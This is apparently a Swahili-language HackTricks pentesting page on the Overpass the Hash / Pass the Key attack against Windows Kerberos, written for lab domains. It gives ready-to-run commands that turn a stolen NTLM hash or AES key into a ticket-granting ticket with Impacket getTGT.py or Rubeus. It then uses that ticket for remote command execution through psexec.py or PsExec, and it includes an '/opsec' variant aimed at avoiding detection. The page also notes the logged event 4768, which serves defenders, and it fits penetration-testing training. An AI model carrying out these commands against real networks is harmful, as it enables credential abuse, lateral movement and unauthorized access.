# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Overpass The Hash/Pass The Key (PTK)

Shambulio la **Overpass The Hash/Pass The Key (PTK)** limetengenezwa kwa mazingira ambapo itifaki ya NTLM ya jadi imezuiliwa, na uthibitishaji wa Kerberos unachukua kipaumbele. Shambulio hili linatumia hash ya NTLM au funguo za AES za mtumiaji ili kuomba tiketi za Kerberos, kuruhusu ufikiaji usioidhinishwa kwa rasilimali ndani ya mtandao.

Ili kutekeleza shambulio hili, hatua ya kwanza ni kupata hash ya NTLM au nenosiri la akaunti ya mtumiaji aliyechaguliwa. Baada ya kupata taarifa hii, Tiketi ya Kutoa Tiketi (TGT) kwa akaunti hiyo inaweza kupatikana, ikiruhusu mshambuliaji kufikia huduma au mashine ambazo mtumiaji ana ruhusa.

Mchakato unaweza kuanzishwa kwa amri zifuatazo:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Kwa hali zinazohitaji AES256, chaguo `-aesKey [AES key]` kinaweza kutumika. Aidha, tiketi iliyopatikana inaweza kutumika na zana mbalimbali, ikiwa ni pamoja na smbexec.py au wmiexec.py, kupanua wigo wa shambulio.

Masuala yaliyokutana kama _PyAsn1Error_ au _KDC cannot find the name_ kwa kawaida yanatatuliwa kwa kuboresha maktaba ya Impacket au kutumia jina la mwenyeji badala ya anwani ya IP, kuhakikisha ufanisi na Kerberos KDC.

Mfuatano wa amri mbadala ukitumia Rubeus.exe unaonyesha uso mwingine wa mbinu hii:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Hii mbinu inafanana na **Pass the Key** njia, ikiwa na mkazo wa kuchukua na kutumia tiketi moja kwa moja kwa madhumuni ya uthibitishaji. Ni muhimu kutambua kwamba kuanzishwa kwa ombi la TGT kunasababisha tukio `4768: A Kerberos authentication ticket (TGT) was requested`, ikionyesha matumizi ya RC4-HMAC kama chaguo la default, ingawa mifumo ya kisasa ya Windows inapendelea AES256.

Ili kuzingatia usalama wa operesheni na kutumia AES256, amri ifuatayo inaweza kutumika:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Marejeo

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{{#include ../../banners/hacktricks-training.md}}
